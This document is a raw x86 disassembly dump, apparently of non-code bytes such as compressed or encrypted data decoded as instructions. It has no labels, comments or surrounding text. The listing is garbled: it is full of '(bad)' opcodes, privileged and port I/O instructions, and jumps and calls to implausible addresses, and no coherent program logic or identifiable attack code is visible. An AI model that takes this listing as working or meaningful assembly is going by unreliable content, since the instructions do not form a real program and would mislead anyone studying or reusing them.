  42b226:	mov    eax,ds:0xb7d539d1
  42b22b:	data16 and al,ah
  42b22e:	(bad)  
  42b22f:	hlt    
  42b230:	and    DWORD PTR [ecx-0x261f0eaf],ebp
  42b236:	cmp    BYTE PTR [ebx],cl
  42b238:	or     ebp,DWORD PTR ds:0x5a7e9465
  42b23e:	mov    edx,DWORD PTR [eax-0x2f044067]
  42b244:	jmp    0x42b257
  42b246:	cli    
  42b247:	aad    0xfb
  42b249:	mov    bl,0xd9
  42b24b:	xlat   BYTE PTR ds:[ebx]
  42b24c:	aaa    
  42b24d:	lods   al,BYTE PTR ds:[esi]
  42b24e:	pop    es
  42b24f:	inc    edx
  42b250:	out    dx,al
  42b251:	bound  esi,QWORD PTR [esi]
  42b253:	or     al,0x57
  42b255:	jnp    0x42b2b3
  42b257:	fdivrp st(0),st
  42b259:	ret    
  42b25a:	add    DWORD PTR [ecx+0x38],ebx
  42b25d:	cwde   
  42b25e:	sbb    DWORD PTR [ebp+0x6d],esi
  42b261:	sub    BYTE PTR [edx],bl
  42b263:	xor    eax,0xe840c933
  42b268:	scas   al,BYTE PTR es:[edi]
  42b269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b26a:	fisttp QWORD PTR [edx+0x35afa190]
  42b270:	ss pusha 
  42b272:	mov    dl,0xfb
  42b274:	bound  esp,QWORD PTR [edi]
  42b276:	fisubr DWORD PTR ds:0xecf2190e
  42b27c:	push   0x43bddfd
  42b281:	mov    eax,0x7f1d63c5
  42b286:	pushf  
  42b287:	and    eax,0x23535c7a
  42b28c:	scas   eax,DWORD PTR es:[edi]
  42b28d:	pop    ss
  42b28e:	mov    bl,0x63
  42b290:	(bad)  
  42b291:	xchg   edi,eax
  42b292:	(bad)  
  42b294:	and    al,BYTE PTR [edi-0x3]
  42b297:	jns    0x42b2be
  42b299:	data16 aad 0x35
  42b29c:	inc    esi
  42b29d:	(bad)  
  42b29e:	popa   
  42b29f:	inc    edi
  42b2a0:	inc    eax
  42b2a1:	xor    dh,BYTE PTR [ebx-0x80]
  42b2a4:	mov    ds:0x10c24760,eax
  42b2a9:	cdq    
  42b2aa:	push   eax
  42b2ab:	daa    
  42b2ac:	inc    esp
  42b2ad:	stos   DWORD PTR es:[edi],eax
  42b2ae:	lods   al,BYTE PTR fs:[esi]
  42b2b0:	(bad)  
  42b2b2:	push   0x1
  42b2b4:	jb     0x42b31e
  42b2b6:	mov    esp,0x4f31771b
  42b2bb:	cs adc edx,DWORD PTR es:0xe800c3f0
  42b2c3:	fiadd  DWORD PTR ds:[ebp+0x4c]
  42b2c7:	and    eax,0xc6d25900
  42b2cc:	loop   0x42b2a6
  42b2ce:	and    ah,BYTE PTR [edi-0x5181a3ae]
  42b2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2d5:	dec    ebp
  42b2d6:	xchg   esp,eax
  42b2d7:	add    BYTE PTR [esi-0x43],bl
  42b2da:	mov    es,eax
  42b2dc:	inc    edi
  42b2dd:	xchg   BYTE PTR [eax+ebx*8-0x73a64433],ah
  42b2e4:	out    0x25,al
  42b2e6:	ds ss jecxz 0x42b33d
  42b2ea:	mov    DWORD PTR [edx+0xbda5],edi
	...
  42b354:	add    BYTE PTR [eax],al
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x1d738e65
  42b363:	xor    eax,0xcf67e25a
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	lods   eax,DWORD PTR ds:[esi]
  42b36f:	aas    
  42b370:	iret   
  42b371:	sub    bl,bh
  42b373:	xchg   ecx,eax
  42b374:	push   ecx
  42b375:	push   es
  42b376:	jg     0x42b37f
  42b378:	and    ebx,DWORD PTR ds:0x2f68f976
  42b37e:	or     edi,DWORD PTR [edx-0x7c]
  42b381:	push   edi
  42b382:	add    al,0xe1
  42b384:	fs pop esp
  42b386:	bound  esi,QWORD PTR [edi]
  42b388:	xor    eax,0xef1fe820
  42b38d:	ja     0x42b330
  42b38f:	stc    
  42b390:	imul   esp,DWORD PTR [edi],0x57
  42b393:	ins    BYTE PTR es:[edi],dx
  42b394:	xchg   ebp,eax
  42b395:	dec    esi
  42b396:	frstor [ebp+eiz*2+0x4c]
  42b39a:	mov    ds:0x1a69d1c5,eax
  42b39f:	sbb    eax,DWORD PTR [ebx]
  42b3a1:	fst    QWORD PTR [ebp-0x7709918b]
  42b3a7:	aas    
  42b3a8:	test   al,0x52
  42b3aa:	cld    
  42b3ab:	push   0x6a
  42b3ad:	aad    0xc3
  42b3af:	les    ebx,FWORD PTR [ecx]
  42b3b1:	scas   al,BYTE PTR es:[edi]
  42b3b2:	sub    BYTE PTR [ebx-0x22],0x5c
  42b3b6:	test   DWORD PTR [ecx],esp
  42b3b8:	jae    0x42b401
  42b3ba:	dec    ebx
  42b3bb:	add    eax,0x52729a63
  42b3c0:	jl     0x42b41d
  42b3c2:	dec    esp
  42b3c3:	je     0x42b3f2
  42b3c5:	pop    eax
  42b3c6:	fldcw  WORD PTR [eax+0x424f270]
  42b3cc:	pop    ebx
  42b3cd:	shl    BYTE PTR [esi+0x66],0x69
  42b3d1:	push   eax
  42b3d2:	fs push es
  42b3d4:	scas   eax,DWORD PTR es:[edi]
  42b3d5:	jecxz  0x42b3a0
  42b3d7:	jnp    0x42b3b5
  42b3d9:	and    eax,0xf0adaa21
  42b3de:	sahf   
  42b3df:	es sbb al,0x48
  42b3e2:	jmp    0xe3cf:0xd5e731e9
  42b3e9:	sbb    BYTE PTR [esi-0x63],cl
  42b3ec:	(bad)  
  42b3ee:	mul    BYTE PTR [edi-0x27]
  42b3f1:	pop    edx
  42b3f2:	ret    
  42b3f3:	retf   
  42b3f4:	fs scas al,BYTE PTR es:[edi]
  42b3f6:	cmp    BYTE PTR [edi+esi*4-0x73],al
  42b3fa:	lods   al,BYTE PTR ds:[esi]
  42b3fb:	sub    bl,al
  42b3fd:	adc    DWORD PTR [edi+0x78],0x34d212f7
  42b404:	aas    
  42b405:	les    eax,FWORD PTR [edi]
  42b407:	pop    edx
  42b408:	xchg   edx,eax
  42b409:	jmp    0x42b431
  42b40b:	test   DWORD PTR [esi+0xb],ebx
  42b40e:	pop    ebx
  42b40f:	xchg   ecx,eax
  42b410:	and    ebp,esi
  42b412:	call   0x7ac1524a
  42b417:	cwde   
  42b418:	lahf   
  42b419:	push   ecx
  42b41a:	push   0xffffff90
  42b41c:	hlt    
  42b41d:	pop    ds
  42b41e:	dec    ebp
  42b41f:	bnd ret 0x757a
  42b423:	in     eax,0xc5
  42b425:	popa   
  42b426:	pop    esp
  42b427:	fs pop es
  42b429:	jmp    0x42b3fe
  42b42b:	dec    ebp
  42b42c:	xchg   edi,eax
  42b42d:	cmp    edi,DWORD PTR [ecx]
  42b42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b430:	dec    ebx
  42b431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b432:	ja     0x42b491
  42b434:	dec    edx
  42b435:	pop    edx
  42b436:	add    eax,0xe3233a2
  42b43b:	and    BYTE PTR [ebx+0x1a],dl
  42b43e:	loopne 0x42b45c
  42b440:	and    BYTE PTR [ebx],0x2d
  42b443:	test   DWORD PTR [ebp-0x7da776d3],esp
  42b449:	outs   dx,DWORD PTR ds:[esi]
  42b44a:	das    
  42b44b:	push   ebx
  42b44c:	retf   
  42b44d:	dec    ebp
  42b44e:	and    BYTE PTR [edi],0x43
  42b451:	scas   al,BYTE PTR es:[edi]
  42b452:	or     eax,DWORD PTR [eax+esi*4+0x2]
  42b456:	jne    0x42b3ff
  42b458:	clc    
  42b459:	xchg   DWORD PTR [ebx-0x2f],ecx
  42b45c:	imul   eax,esi,0x7668c469
  42b462:	xor    bh,bl
  42b464:	pop    esp
  42b465:	test   al,0xc6
  42b467:	jg     0x42b3ff
  42b469:	and    edi,DWORD PTR [edi]
  42b46b:	sub    ch,BYTE PTR [edx+0x36]
	...
  42b4d5:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [ebx+0x7e],eax
  42b4e4:	gs or  al,0x67
  42b4e7:	rol    BYTE PTR [ecx],1
  42b4e9:	add    BYTE PTR [eax],al
  42b4eb:	add    DWORD PTR [eax],eax
  42b4ed:	add    BYTE PTR [eax],cl
  42b4ef:	maxps  xmm4,XMMWORD PTR [eax+0x55]
  42b4f3:	add    cl,BYTE PTR [ecx-0x7d]
  42b4f6:	xchg   BYTE PTR ds:0xe8d86340,ch
  42b4fc:	jle    0x42b4db
  42b4fe:	xchg   esi,eax
  42b4ff:	pop    edx
  42b500:	mov    al,0xaf
  42b502:	aad    0x77
  42b504:	enter  0xe5a8,0x62
  42b508:	aad    0x70
  42b50a:	call   0x29146e09
  42b50f:	mov    dh,0xf2
  42b511:	arpl   bx,di
  42b513:	rol    ch,1
  42b515:	mov    ds:0x51b1c291,eax
  42b51a:	push   edi
  42b51b:	lods   al,BYTE PTR ds:[esi]
  42b51c:	mov    BYTE PTR [eax-0x7c43d07d],ch
  42b522:	jl     0x42b56a
  42b524:	fdiv   QWORD PTR [edi]
  42b526:	icebp  
  42b527:	fnop   
  42b529:	push   ecx
  42b52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b52b:	cmp    BYTE PTR [esi],dl
  42b52d:	pusha  
  42b52e:	pusha  
  42b52f:	scas   eax,DWORD PTR es:[edi]
  42b530:	mov    esp,0x65eae5a8
  42b535:	and    bh,al
  42b537:	shr    BYTE PTR [esi+0x26b6835a],1
  42b53d:	dec    ecx
  42b53e:	imul   edx,DWORD PTR [eax-0x689877a6],0x642b7ac8
  42b548:	(bad)  
  42b549:	mov    edx,0x24a422c8
  42b54e:	test   BYTE PTR [esi-0x65],al
  42b551:	jo     0x42b4ff
  42b553:	aam    0x10
  42b555:	repnz push cs
  42b557:	push   edi
  42b558:	inc    ecx
  42b559:	ss push 0x75dea357
  42b55f:	or     eax,0x46158082
  42b564:	dec    esi
  42b565:	cld    
  42b566:	mov    al,0xe5
  42b568:	out    dx,eax
  42b569:	mov    ah,0x6f
  42b56b:	rcl    BYTE PTR [edi+0x4e],1
  42b56e:	shl    DWORD PTR [ecx+0x44aeec05],1
  42b574:	dec    edx
  42b575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b576:	aas    
  42b577:	lds    esp,FWORD PTR [edx]
  42b579:	push   ecx
  42b57a:	stos   DWORD PTR es:[edi],eax
  42b57b:	jae    0x42b53a
  42b57d:	imul   esi,DWORD PTR [edx+0x48befa2a],0x71c86952
  42b587:	outs   dx,BYTE PTR ds:[esi]
  42b588:	int    0xd4
  42b58a:	cwde   
  42b58b:	jb     0x42b562
  42b58d:	lds    ecx,FWORD PTR [ecx-0x68]
  42b590:	sar    DWORD PTR [edx+0x302b5ca1],0x36
  42b597:	jmp    DWORD PTR ds:0xb4867377
  42b59d:	bound  esp,QWORD PTR [esi+0x120fecc]
  42b5a3:	or     ch,BYTE PTR [eax]
  42b5a5:	cmp    BYTE PTR [edi+0x7a],cl
  42b5a8:	inc    ebx
  42b5a9:	out    0xa2,al
  42b5ab:	inc    esi
  42b5ac:	mov    dh,0x5d
  42b5ae:	xor    eax,0xaa4f2c8f
  42b5b3:	std    
  42b5b4:	(bad)  
  42b5b5:	mov    WORD PTR [ebp+0x2a],ds
  42b5b8:	fistp  WORD PTR [esi]
  42b5ba:	xor    bh,ah
  42b5bc:	test   BYTE PTR [ebx-0x24],cl
  42b5bf:	aam    0x79
  42b5c1:	push   ds
  42b5c2:	stos   DWORD PTR es:[edi],eax
  42b5c3:	adc    eax,0x8de50564
  42b5c8:	xacquire xchg DWORD PTR [eax+ebp*2+0x9821544],ebx
  42b5d0:	fwait
  42b5d1:	or     al,0x37
  42b5d3:	fdivrp st(2),st
  42b5d5:	pop    esp
  42b5d6:	popa   
  42b5d7:	push   esp
  42b5d8:	arpl   WORD PTR [esi-0x4dcb2808],bp
  42b5de:	cmp    ebx,DWORD PTR [ebp-0x77]
  42b5e1:	lods   al,BYTE PTR ds:[esi]
  42b5e2:	adc    ebx,DWORD PTR [ebx-0x54]
  42b5e5:	stos   BYTE PTR es:[edi],al
  42b5e6:	inc    esp
  42b5e7:	adc    al,0xcc
  42b5e9:	adc    dh,BYTE PTR [ebx+0x1b1588]
	...
  42b653:	add    BYTE PTR [eax],al
  42b655:	add    al,ah
  42b657:	xchg   esp,eax
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	adc    ebp,DWORD PTR [edx+eiz*8+0xb]
  42b666:	rol    DWORD PTR [bx+di],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [eax+0x34],dh
  42b670:	push   0xc
  42b672:	jmp    0x7977:0xb1fc866a
  42b679:	mov    eax,ds:0x45a881bb
  42b67e:	pop    esp
  42b67f:	mov    edi,0xcfc492a5
  42b684:	dec    ebx
  42b685:	jnp    0x42b6d3
  42b687:	(bad)  
  42b688:	gs call 0xc830d290
  42b68e:	aas    
  42b68f:	sub    DWORD PTR [edx-0x2a],0xffffffd2
  42b693:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b695:	xchg   edi,eax
  42b696:	loopne 0x42b6c7
  42b698:	ins    DWORD PTR es:[edi],dx
  42b699:	repnz rcr ecx,cl
  42b69c:	fdiv   st(7),st
  42b69e:	imul   ecx,edi,0xc7b44831
  42b6a4:	add    ah,BYTE PTR [ecx-0x1aa49e48]
  42b6aa:	mov    ds:0x5dfd5217,eax
  42b6af:	scas   eax,DWORD PTR es:[edi]
  42b6b0:	icebp  
  42b6b1:	js     0x42b678
  42b6b3:	sbb    BYTE PTR [esi],dl
  42b6b5:	(bad)  
  42b6b6:	test   al,0xd6
  42b6b8:	call   0xd836:0xc8117ff8
  42b6bf:	fcom   QWORD PTR [esi-0x27]
  42b6c2:	xchg   edx,eax
  42b6c3:	lods   al,BYTE PTR ds:[esi]
  42b6c4:	mov    ds:0xfd9d5d79,eax
  42b6c9:	test   al,0x7e
  42b6cb:	mov    esp,DWORD PTR [edx]
  42b6cd:	push   edx
  42b6ce:	pop    ebx
  42b6cf:	stos   BYTE PTR es:[edi],al
  42b6d0:	mov    eax,0xee498524
  42b6d5:	pop    edi
  42b6d6:	repz (bad) 
  42b6d8:	and    dl,BYTE PTR [ebx]
  42b6da:	and    ah,ch
  42b6dc:	adc    ecx,ebx
  42b6de:	cmp    DWORD PTR [ebx+0x17],esi
  42b6e1:	inc    eax
  42b6e2:	pop    ds
  42b6e3:	out    dx,al
  42b6e4:	push   ebx
  42b6e5:	xchg   ecx,eax
  42b6e6:	aad    0xf5
  42b6e8:	sub    eax,0xe94202e2
  42b6ed:	push   0x73
  42b6ef:	jno    0x42b770
  42b6f1:	mov    BYTE PTR [edx+0x6a],0x39
  42b6f5:	cmp    al,0xa0
  42b6f7:	sbb    bl,ah
  42b6f9:	rcl    edi,cl
  42b6fb:	mov    esp,0xdce75ce7
  42b700:	mov    ecx,0x4b71b0b
  42b705:	push   ecx
  42b706:	invd   
  42b708:	or     eax,0x517529f2
  42b70d:	ss icebp 
  42b70f:	jmp    0x42b74f
  42b711:	xor    BYTE PTR [ebx+0x77f4ec57],0x8f
  42b718:	xor    eax,0xb54dfdeb
  42b71d:	imul   edi,eax,0x3a
  42b720:	test   eax,0x5c4f56ac
  42b725:	mov    ecx,0xa942e76e
  42b72a:	pop    ecx
  42b72b:	test   DWORD PTR [edi-0x48c3c4ce],ecx
  42b731:	mov    eax,0x79e22200
  42b736:	fldenv [ebp-0x6d]
  42b739:	jp     0x42b78c
  42b73b:	dec    edi
  42b73c:	stos   BYTE PTR es:[edi],al
  42b73d:	xor    eax,0x13cbba44
  42b742:	push   0x1ee22d15
  42b747:	pop    ebp
  42b749:	inc    esp
  42b74a:	push   0x5728f8ec
  42b74f:	test   BYTE PTR [edx],ah
  42b751:	and    edi,ebx
  42b753:	arpl   bx,di
  42b755:	mov    edi,edi
  42b757:	and    BYTE PTR [esi],al
  42b759:	shr    DWORD PTR gs:[ebp-0x1],cl
  42b75d:	pop    edx
  42b75e:	test   BYTE PTR [ebp+0x7ab68fc5],ah
  42b764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b765:	jp     0x42b735
  42b767:	fisttp QWORD PTR [esi-0xb1154dc]
  42b76d:	mov    es,WORD PTR [eax]
	...
  42b7d3:	add    BYTE PTR [eax],al
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	push   cs
  42b7e3:	js     0x42b788
  42b7e5:	inc    edi
  42b7e6:	rol    BYTE PTR [bx+di],cl
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    cl,bl
  42b7ef:	daa    
  42b7f0:	pop    esp
  42b7f1:	mov    dh,0xc0
  42b7f3:	test   al,0x52
  42b7f5:	and    ch,BYTE PTR [edi]
  42b7f7:	scas   al,BYTE PTR es:[edi]
  42b7f8:	cmp    al,0x38
  42b7fa:	pop    esp
  42b7fb:	sbb    al,0xb4
  42b7fd:	sub    DWORD PTR [edi],edi
  42b7ff:	les    eax,FWORD PTR [edx]
  42b801:	mov    bh,0x9f
  42b803:	(bad)  
  42b804:	push   ss
  42b805:	push   ebx
  42b806:	fwait
  42b807:	popa   
  42b808:	pop    edi
  42b809:	mov    ch,0x11
  42b80b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b80c:	xor    BYTE PTR [ebx],cl
  42b80e:	mov    ch,0xa9
  42b810:	ins    DWORD PTR es:[edi],dx
  42b811:	pusha  
  42b812:	dec    edx
  42b813:	clc    
  42b814:	sbb    BYTE PTR [ebx],0xf1
  42b817:	push   ds
  42b818:	push   ss
  42b819:	out    dx,al
  42b81a:	aam    0x3e
  42b81c:	nop
  42b81d:	and    bl,BYTE PTR [ecx+0x7b319a78]
  42b823:	ins    BYTE PTR es:[edi],dx
  42b824:	sar    DWORD PTR [ebx],cl
  42b826:	sar    DWORD PTR [ebx],1
  42b828:	cmp    BYTE PTR [ecx+0x2196e712],bh
  42b82e:	into   
  42b82f:	aaa    
  42b830:	aaa    
  42b831:	dec    DWORD PTR [eax-0x4f1ca172]
  42b837:	aam    0x76
  42b839:	stos   DWORD PTR es:[edi],eax
  42b83a:	cmp    eax,0xcb7e354e
  42b83f:	add    edi,DWORD PTR [eax-0x5d8cab18]
  42b845:	and    al,0xa7
  42b847:	push   ebp
  42b848:	les    eax,FWORD PTR [edi+0x10bf3b70]
  42b84e:	fcomi  st,st(7)
  42b850:	rcr    DWORD PTR [esi+0x10],1
  42b853:	mov    dl,0xc4
  42b855:	test   al,0x36
  42b857:	stos   BYTE PTR es:[edi],al
  42b858:	(bad)  
  42b859:	test   al,0xc9
  42b85b:	dec    eax
  42b85c:	dec    ecx
  42b85d:	mov    WORD PTR [ebx-0x72],?
  42b860:	lahf   
  42b861:	int3   
  42b862:	adc    al,dl
  42b864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b865:	jns    0x42b844
  42b867:	pop    es
  42b868:	mov    edx,0x4f8be87b
  42b86d:	and    ebp,DWORD PTR [edi+edi*4]
  42b870:	dec    esi
  42b871:	adc    al,0xf5
  42b873:	stos   DWORD PTR es:[edi],eax
  42b874:	mov    edi,0xe2dcd055
  42b879:	daa    
  42b87a:	or     DWORD PTR [edx],edx
  42b87c:	aas    
  42b87d:	nop
  42b87e:	and    cl,BYTE PTR [edx+ecx*4]
  42b881:	sbb    ebp,DWORD PTR [edi]
  42b883:	pop    ebx
  42b884:	mov    bh,0xda
  42b886:	(bad)  
  42b888:	pusha  
  42b889:	dec    esi
  42b88a:	(bad)  
  42b88b:	outs   dx,DWORD PTR ds:[esi]
  42b88c:	in     eax,dx
  42b88d:	push   ebx
  42b88e:	imul   edx,DWORD PTR [eax+ebx*1+0x53db5296],0xffffff99
  42b896:	jg     0x42b891
  42b898:	mov    ds:0xfc789110,eax
  42b89d:	jne    0x42b8fe
  42b89f:	mov    ds:0x4f87bbc6,al
  42b8a4:	in     al,dx
  42b8a5:	jl     0x42b864
  42b8a7:	or     bh,BYTE PTR [edx]
  42b8a9:	ins    DWORD PTR es:[edi],dx
  42b8aa:	jne    0x42b8c8
  42b8ac:	popf   
  42b8ad:	hlt    
  42b8ae:	and    BYTE PTR [ebx-0x33],0xd8
  42b8b2:	and    al,BYTE PTR [esi]
  42b8b4:	xor    BYTE PTR [ecx],bh
  42b8b6:	shl    esi,0xa0
  42b8b9:	pop    esi
  42b8ba:	mov    ds:0x2725b1c3,al
  42b8bf:	loope  0x42b932
  42b8c1:	mov    ah,0xbd
  42b8c3:	inc    ebx
  42b8c4:	in     al,0x7f
  42b8c6:	popa   
  42b8c7:	adc    DWORD PTR fs:[eax-0x4d],0x38937eec
  42b8cf:	sbb    BYTE PTR [eax-0x11359646],ch
  42b8d5:	retf   0xa89d
  42b8d8:	push   ss
  42b8d9:	shl    bh,1
  42b8db:	mov    bl,BYTE PTR ds:0x6fe3f56a
  42b8e1:	out    dx,al
  42b8e2:	jecxz  0x42b88a
  42b8e4:	stc    
  42b8e5:	cwde   
  42b8e6:	mov    al,ds:0x428b7cb8
  42b8eb:	(bad)  
  42b8ec:	xchg   ecx,eax
  42b8ed:	xchg   ebp,eax
	...
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     ecx,DWORD PTR [ecx-0x23]
  42b964:	adc    al,0xb0
  42b966:	rol    DWORD PTR [bx+di],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    bh,ah
  42b96f:	repz xchg edi,eax
  42b971:	or     dl,BYTE PTR [ebp+0x1c]
  42b974:	mov    bh,0xea
  42b976:	xchg   ebx,eax
  42b977:	out    0xd0,al
  42b979:	push   0xffffffd5
  42b97b:	push   ecx
  42b97c:	or     eax,0x7fa2fd7d
  42b981:	dec    edi
  42b982:	out    dx,al
  42b983:	add    eax,0x70d6602c
  42b988:	add    edx,eax
  42b98a:	xchg   DWORD PTR [eax-0x7b9f9d79],eax
  42b990:	sub    BYTE PTR [edi-0x2a],bl
  42b993:	loopne 0x42b9c6
  42b995:	pop    ebp
  42b996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b997:	fdiv   st,st(0)
  42b999:	(bad)  
  42b99a:	mov    ds:0x43eb7ded,eax
  42b99f:	arpl   WORD PTR [esp+ecx*4],dx
  42b9a2:	lahf   
  42b9a3:	loop   0x42b99b
  42b9a5:	(bad)  
  42b9a7:	inc    ebx
  42b9a8:	inc    edx
  42b9a9:	push   edi
  42b9aa:	out    dx,al
  42b9ab:	jmp    0x42b9c2
  42b9ad:	or     DWORD PTR [esi+edi*8],esi
  42b9b0:	repnz shl DWORD PTR [edx+edi*4-0x1b],0x62
  42b9b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9b7:	pop    ebp
  42b9b8:	mov    ebx,0xe37c6869
  42b9bd:	jne    0x42b9a1
  42b9bf:	inc    ebp
  42b9c0:	sbb    DWORD PTR [edi+eiz*1+0x1c13a50c],edi
  42b9c7:	push   ds
  42b9c8:	hlt    
  42b9c9:	or     ecx,DWORD PTR [eax]
  42b9cb:	pop    ebp
  42b9cc:	add    edi,DWORD PTR [edx-0x43dc8483]
  42b9d2:	xor    bh,BYTE PTR [ecx+0x3b729f50]
  42b9d8:	fisub  DWORD PTR [esp+esi*4+0x11]
  42b9dc:	dec    edi
  42b9dd:	loop   0x42b9c0
  42b9df:	(bad)  
  42b9e0:	std    
  42b9e1:	adc    edi,ebp
  42b9e3:	dec    edi
  42b9e4:	cmp    eax,0x152dbc0
  42b9e9:	fcomp  st(5)
  42b9eb:	jb     0x42ba5e
  42b9ed:	enter  0x6707,0xf8
  42b9f1:	daa    
  42b9f2:	arpl   WORD PTR [ebp-0x146aea2e],di
  42b9f8:	fsub   DWORD PTR [eax+0x28]
  42b9fb:	test   ah,dl
  42b9fd:	cmp    DWORD PTR [edx+ebx*2+0x61925484],edx
  42ba04:	jns    0x42ba44
  42ba06:	icebp  
  42ba07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba08:	cmp    esp,esi
  42ba0a:	jg     0x42b9ec
  42ba0c:	pop    eax
  42ba0d:	cmp    edx,DWORD PTR [edi-0x1b]
  42ba10:	inc    ecx
  42ba11:	cwde   
  42ba12:	rep repnz outs dx,DWORD PTR es:[esi]
  42ba16:	mov    DWORD PTR [eax],eax
  42ba18:	sub    eax,0x54b4d14d
  42ba1d:	xlat   BYTE PTR ds:[ebx]
  42ba1e:	sub    ecx,DWORD PTR [eax-0x1991b36d]
  42ba24:	jp     0x42baa4
  42ba26:	push   0xce15989c
  42ba2b:	mov    bl,0xf3
  42ba2d:	pop    ebp
  42ba2e:	mov    al,0x8d
  42ba30:	push   cs
  42ba31:	scas   al,BYTE PTR es:[edi]
  42ba32:	and    bl,BYTE PTR [edi-0x4e]
  42ba35:	test   eax,0x1fc1d72c
  42ba3a:	pop    ebx
  42ba3b:	jmp    0xe3b3b329
  42ba40:	imul   ebx,DWORD PTR [ebx],0x54
  42ba43:	jae    0x42ba82
  42ba45:	mov    edi,es
  42ba47:	pop    ebp
  42ba48:	sbb    eax,0xe600bbb9
  42ba4d:	mov    edi,0x55b02daf
  42ba52:	jle    0x42baa0
  42ba54:	arpl   WORD PTR [ebx],di
  42ba56:	sahf   
  42ba57:	pop    ecx
  42ba58:	out    dx,al
  42ba59:	mov    ah,0x6d
  42ba5b:	mov    bl,0x59
  42ba5d:	popf   
  42ba5e:	retf   
  42ba5f:	addr16 jle 0x42ba43
  42ba62:	push   ecx
  42ba63:	lea    eax,[edx+eax*8]
  42ba66:	jge    0x42ba60
  42ba68:	xchg   edx,eax
  42ba69:	shl    DWORD PTR [esi+0x47],1
  42ba6c:	cldemote BYTE PTR [eax]
	...
  42bad3:	add    BYTE PTR [eax],al
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [edi+edx*1-0x2b984b10],esi
  42bae8:	add    DWORD PTR [eax],eax
  42baea:	add    BYTE PTR [ecx],al
  42baec:	add    BYTE PTR [eax],al
  42baee:	pop    ds
  42baef:	add    DWORD PTR [ebx],esi
  42baf1:	add    BYTE PTR [esi+0x7110e27b],dl
  42baf7:	add    eax,DWORD PTR [ebx+0x1dcc6b5d]
  42bafd:	sti    
  42bafe:	push   ecx
  42baff:	arpl   WORD PTR [ebx-0x4d],si
  42bb02:	pop    esi
  42bb03:	push   eax
  42bb04:	xor    eax,0xce3311b4
  42bb09:	inc    edx
  42bb0a:	sar    BYTE PTR [ecx-0x125de012],cl
  42bb10:	jns    0x42bade
  42bb12:	cli    
  42bb13:	jg     0x42bb71
  42bb15:	inc    edi
  42bb16:	fst    DWORD PTR [edx+edx*4-0x4c15c2a5]
  42bb1d:	xlat   BYTE PTR ds:[ebx]
  42bb1e:	data16 mov BYTE PTR [ecx],ah
  42bb21:	stos   BYTE PTR es:[edi],al
  42bb22:	push   ecx
  42bb23:	jno    0x42babd
  42bb25:	aad    0xfc
  42bb27:	push   0x7252a045
  42bb2c:	repnz or edi,DWORD PTR [eax-0x6a]
  42bb30:	xor    al,0xa7
  42bb32:	jb     0x42bb7b
  42bb34:	cmp    al,0xc4
  42bb36:	loope  0x42bb7c
  42bb38:	lahf   
  42bb39:	fmulp  st(7),st
  42bb3b:	add    ah,bl
  42bb3d:	jne    0x42bb43
  42bb3f:	in     al,dx
  42bb40:	mov    edi,0x2653b6ab
  42bb45:	xchg   BYTE PTR [ebp-0x523b8766],bh
  42bb4b:	inc    esp
  42bb4c:	mov    ds:0xc25b9493,al
  42bb51:	jbe    0x42bad8
  42bb53:	adc    eax,0x90a226bd
  42bb58:	inc    ebx
  42bb59:	lea    ecx,[esi-0x3a]
  42bb5c:	in     eax,dx
  42bb5d:	inc    eax
  42bb5e:	jle    0x42bb99
  42bb60:	xchg   ebp,eax
  42bb61:	jmp    0x42bbbe
  42bb63:	sbb    eax,0x1e6c4edf
  42bb68:	mov    dl,0x8
  42bb6a:	jae    0x42bbc2
  42bb6c:	ds jns 0x42bb20
  42bb6f:	xchg   esi,eax
  42bb70:	xchg   esp,eax
  42bb71:	inc    ebp
  42bb72:	add    ch,BYTE PTR [ebp-0x2c]
  42bb75:	push   eax
  42bb76:	dec    esp
  42bb77:	pop    esi
  42bb78:	dec    edi
  42bb79:	ss mov edi,0x9a5ba8ec
  42bb7f:	or     DWORD PTR [edx-0x80],esi
  42bb82:	icebp  
  42bb83:	les    eax,FWORD PTR [esi]
  42bb85:	cmp    DWORD PTR [edx+0x42],edx
  42bb88:	popf   
  42bb89:	adc    esp,DWORD PTR [eax+0x26]
  42bb8c:	push   0xffffffb4
  42bb8e:	das    
